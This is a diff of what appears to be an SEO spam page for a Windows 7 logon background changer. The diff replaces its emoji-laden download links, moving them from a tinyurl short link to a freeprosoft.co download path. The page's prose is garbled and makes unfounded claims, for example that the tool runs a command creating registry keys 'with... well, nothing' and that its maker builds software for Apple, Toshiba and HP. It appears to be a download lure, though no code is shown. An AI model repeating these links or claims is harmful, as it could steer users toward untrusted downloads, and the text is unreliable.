@@ -7,9 +7,9 @@
  It doesn't change any existing system file and neither does the software itself need admin rights to run - it will simply ask you to run a very basic command prompt that creates the necessary directory and registry keys with...
  well, nothing. The beauty of this is that it works on any Windows version (including Windows Vista and XP), even though the program technically doesn't have to support those operating systems at all.
  This is because the software has been created by a professional company who also make software for several other brands of computers as well, including brands like Apple, Toshiba and HP.
-## [✔🎉🚀Download Updated Link](https://tinyurl.com/29c2n6ax)
+## [✔🎉🚀Download Updated Link](https://freeprosoft.co/ddl/)
 
-## [✔🎉🚀Download Setup](https://tinyurl.com/29c2n6ax)
+## [✔🎉🚀Download Setup](https://freeprosoft.co/ddl/)
 
 Windows 7 logon background changer offline
 
@@ -27,4 +27,4 @@ tweaks.com logon changer
 
 Windows 7 lock screen wallpaper
 
-## [✔🎉🚀Thanks For Downloading 👍😊](https://tinyurl.com/29c2n6ax)
+## [✔🎉🚀Thanks For Downloading 👍😊](https://freeprosoft.co/ddl/)
